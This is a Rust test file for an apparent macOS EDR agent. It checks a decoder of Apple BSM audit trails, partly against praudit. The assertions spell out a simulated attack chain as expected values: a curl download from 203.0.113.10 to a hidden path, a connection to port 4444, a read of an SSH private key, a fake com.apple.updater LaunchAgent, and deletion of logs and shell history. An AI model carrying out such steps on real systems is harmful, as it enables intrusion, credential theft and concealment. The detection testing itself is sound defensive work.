//! Tests against binary audit trails built with Apple's libbsm.
//!
//! The trails in tests/fixtures/bsm come from tools/bsm-fixtures/make_bsm_fixtures.c.
//! Where praudit is installed (every Mac), the decoder is also compared with
//! Apple's own decoder record by record.

use agent_macos::capture_macos_rotating::{run_replay, SegmentIndex};
use agent_macos::sensors::bsm::aue;
use agent_macos::sensors::bsm::{parse_record, BsmRecord, Normalizer, RecordSplitter};
use edr_core::Event;
use std::path::PathBuf;

fn fixture(name: &str) -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .join("../../tests/fixtures/bsm")
        .join(name)
}

fn records(name: &str) -> Vec<(Vec<u8>, BsmRecord)> {
    let data = std::fs::read(fixture(name)).expect("fixture present");
    let mut splitter = RecordSplitter::new();
    splitter.feed(&data);
    let mut out = Vec::new();
    while let Some(bytes) = splitter.next_record() {
        let rec = parse_record(&bytes).expect("record parses");
        out.push((bytes, rec));
    }
    assert_eq!(splitter.buffered(), 0, "trailing bytes left in {}", name);
    assert_eq!(splitter.skipped_bytes, 0);
    out
}

fn events(name: &str) -> Vec<Event> {
    let mut normalizer = Normalizer::new("test-mac", "bsm");
    records(name)
        .iter()
        .filter_map(|(_, rec)| normalizer.normalize(rec))
        .collect()
}

fn field<'a>(event: &'a Event, key: &str) -> &'a serde_json::Value {
    event.fields.get(key).unwrap_or_else(|| panic!("missing field {} in {:?}", key, event.tags))
}

#[test]
fn every_token_in_both_trails_is_understood() {
    for name in ["attack_chain.bsm", "benign_session.bsm"] {
        for (_, rec) in records(name) {
            assert!(rec.unknown_token.is_none(), "{} has unknown token in event {}", name, rec.event);
            assert!(rec.subject.is_some(), "{} record {} has no subject", name, rec.event);
            assert!(rec.ret.is_some());
        }
    }
    assert_eq!(records("attack_chain.bsm").len(), 28);
    assert_eq!(records("benign_session.bsm").len(), 8);
}

#[test]
fn execve_record_decodes_like_praudit_shows() {
    let recs = records("attack_chain.bsm");
    let (bytes, rec) = &recs[0];
    assert_eq!(rec.byte_count, 227);
    assert_eq!(bytes.len(), 227);
    assert_eq!(rec.event, aue::AUE_EXECVE);
    assert_eq!(rec.version, 11);
    assert_eq!(rec.ts_ms, 1_795_446_000_250);
    assert_eq!(rec.exec_args, vec!["curl", "-sLo", "/private/tmp/.cache/upd", "https://203.0.113.10/upd"]);
    assert_eq!(rec.paths, vec!["/usr/bin/curl"]);
    assert_eq!(rec.attrs[0].mode, 0o100755);
    assert_eq!(rec.attrs[0].uid, 0);
    let identity = rec.identity.as_ref().unwrap();
    assert_eq!(identity.signing_id, "com.apple.curl");
    assert_eq!(identity.signer_type, 1);
    assert_eq!(identity.cdhash.len(), 40);
    let subject = rec.subject.as_ref().unwrap();
    assert_eq!((subject.auid, subject.euid, subject.ruid, subject.pid, subject.asid), (501, 501, 501, 4201, 100005));
    assert!(rec.success());
}

#[test]
fn socket_tokens_give_addresses_and_ports() {
    let evs = events("attack_chain.bsm");
    let connects: Vec<&Event> = evs.iter().filter(|e| e.tags[2] == "connect").collect();
    assert_eq!(connects.len(), 3);
    assert_eq!(field(connects[0], "remote_ip"), "203.0.113.10");
    assert_eq!(field(connects[0], "remote_port"), 443);
    assert_eq!(field(connects[1], "remote_ip"), "198.51.100.7");
    assert_eq!(field(connects[1], "remote_port"), 4444);
    // IPv6 port bytes are swapped by au_to_sock_inet128. See record.rs.
    assert_eq!(field(connects[2], "remote_ip"), "2001:db8::5");
    assert_eq!(field(connects[2], "remote_port"), 8443);
    assert_eq!(field(connects[2], "family"), "inet6");
    // File and network records only carry a pid. The exe comes from the
    // earlier exec of that pid.
    assert_eq!(field(connects[1], "exe"), "/private/tmp/.cache/upd");
}

#[test]
fn posix_spawn_uses_child_pid_and_parent() {
    let evs = events("attack_chain.bsm");
    let spawn = evs
        .iter()
        .find(|e| field(e, "aue_code") == aue::AUE_POSIX_SPAWN)
        .unwrap();
    assert_eq!(spawn.tags, vec!["macos", "process", "exec"]);
    assert_eq!(field(spawn, "pid"), 4206);
    assert_eq!(field(spawn, "ppid"), 4100);
    assert_eq!(field(spawn, "exe"), "/bin/launchctl");
    assert_eq!(
        field(spawn, "cmdline"),
        "launchctl load -w /Users/alice/Library/LaunchAgents/com.apple.updater.plist"
    );
}

#[test]
fn file_operations_are_classified_from_the_event_number() {
    let evs = events("attack_chain.bsm");
    let ops: Vec<(String, String)> = evs
        .iter()
        .filter(|e| e.tags[1] == "file")
        .map(|e| (e.tags[2].clone(), field(e, "path").as_str().unwrap().to_string()))
        .collect();
    assert!(ops.contains(&("create".into(), "/private/tmp/.cache/upd".into())));
    assert!(ops.contains(&("chmod".into(), "/private/tmp/.cache/upd".into())));
    assert!(ops.contains(&("read".into(), "/Users/alice/.ssh/id_ed25519".into())));
    assert!(ops.contains(&("create".into(), "/Users/alice/Library/LaunchAgents/com.apple.updater.plist".into())));
    assert!(ops.contains(&("delete".into(), "/private/var/log/system.log".into())));
    assert!(ops.contains(&("delete".into(), "/Users/alice/.zsh_history".into())));

    let tcc = evs
        .iter()
        .find(|e| e.fields.get("path").and_then(|v| v.as_str()).map(|p| p.ends_with("TCC.db")).unwrap_or(false))
        .unwrap();
    assert_eq!(field(tcc, "success"), false);
    assert_eq!(field(tcc, "errno"), 1);

    let rename = evs.iter().find(|e| e.tags[2] == "rename").unwrap();
    assert_eq!(field(rename, "new_path"), "/Users/alice/Library/Application Support/.upd");
    let chmod = evs.iter().find(|e| e.tags[2] == "chmod").unwrap();
    assert_eq!(field(chmod, "new_mode"), "755");
}

#[test]
fn privilege_and_process_control_records() {
    let evs = events("attack_chain.bsm");
    let setuid = evs.iter().find(|e| e.tags[2] == "setuid").unwrap();
    assert_eq!(field(setuid, "target_uid"), 0);
    assert_eq!(field(setuid, "euid"), 0);
    assert_eq!(field(setuid, "auid"), 501);
    assert_eq!(field(setuid, "exe"), "/usr/bin/sudo");

    let tfp = evs.iter().find(|e| e.tags[2] == "task_for_pid").unwrap();
    assert_eq!(field(tfp, "target_pid"), 321);
    assert_eq!(field(tfp, "pid"), 4203);

    let mount = evs.iter().find(|e| e.tags[2] == "mount").unwrap();
    assert_eq!(field(mount, "path"), "/Volumes/payload");
    assert_eq!(field(mount, "fs_type"), "hfs");
}

#[test]
fn sixty_four_bit_and_extended_subject_layouts() {
    let recs = records("benign_session.bsm");
    let (_, rec64) = recs.iter().find(|(b, _)| b[0] == 0x74).expect("header64 record");
    assert_eq!(rec64.event, aue::AUE_EXECVE);
    assert_eq!(rec64.ts_ms, 1_795_446_006_250);
    assert_eq!(rec64.subject.as_ref().unwrap().pid, 5105);
    assert_eq!(rec64.paths, vec!["/usr/bin/sw_vers"]);

    let (_, rec_ex) = recs.iter().last().unwrap();
    let subject = rec_ex.subject.as_ref().unwrap();
    assert_eq!(subject.pid, 5106);
    assert_eq!(subject.terminal_addr, "2001:db8::1");
    assert_eq!(subject.asid, 100006);
}

#[test]
fn replay_writes_segments_and_index() {
    let dir = std::env::temp_dir().join(format!("edr-replay-test-{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&dir);
    let stats = run_replay(&[fixture("attack_chain.bsm"), fixture("benign_session.bsm")], &dir, "test-mac").unwrap();
    assert_eq!(stats.records_read, 36);
    assert_eq!(stats.decode_errors, 0);
    assert_eq!(stats.records_not_handled, 0);

    let index = SegmentIndex::load(&dir.join("index.json")).unwrap();
    assert_eq!(index.segments.len(), 2);
    assert_eq!(index.segments[0].records, 28);
    let first = std::fs::read_to_string(dir.join(&index.segments[0].rel_path)).unwrap();
    let mut line_number = 0;
    for line in first.lines() {
        let event: Event = serde_json::from_str(line).unwrap();
        let ptr = event.evidence_ptr.unwrap();
        assert_eq!(ptr.stream_id, "bsm");
        assert_eq!(ptr.segment_id, 0);
        assert_eq!(ptr.record_index, line_number);
        line_number += 1;
    }
    let _ = std::fs::remove_dir_all(&dir);
}

/// Compare pid, event time and every path with Apple's praudit, one record at a time.
#[test]
fn decoder_agrees_with_praudit() {
    let output = match std::process::Command::new("praudit")
        .args(["-l", "-n", "-r"])
        .arg(fixture("attack_chain.bsm"))
        .output()
    {
        Ok(o) if o.status.success() => o,
        _ => {
            eprintln!("skipping: praudit not available");
            return;
        }
    };
    let text = String::from_utf8_lossy(&output.stdout);
    let lines: Vec<&str> = text.lines().filter(|l| !l.trim().is_empty()).collect();
    let recs = records("attack_chain.bsm");
    assert_eq!(lines.len(), recs.len());

    for (line, (_, rec)) in lines.iter().zip(recs.iter()) {
        // praudit -r prints raw token ids: 20 is header32, 36 is subject32,
        // 35 is path. Fields within a token follow its id.
        let parts: Vec<&str> = line.split(',').collect();
        assert_eq!(parts[0], "20");
        assert_eq!(parts[3].parse::<u16>().unwrap(), rec.event);
        assert_eq!(parts[5].parse::<u64>().unwrap() * 1000 + parts[6].parse::<u64>().unwrap(), rec.ts_ms);

        let subject_at = parts.iter().position(|p| *p == "36").expect("subject token");
        assert_eq!(parts[subject_at + 6].parse::<u32>().unwrap(), rec.subject.as_ref().unwrap().pid);

        let mut praudit_paths = Vec::new();
        let mut i = 0;
        while i + 1 < parts.len() {
            if parts[i] == "35" && parts[i + 1].starts_with('/') {
                praudit_paths.push(parts[i + 1].to_string());
            }
            i += 1;
        }
        assert_eq!(praudit_paths, rec.paths);
    }
}
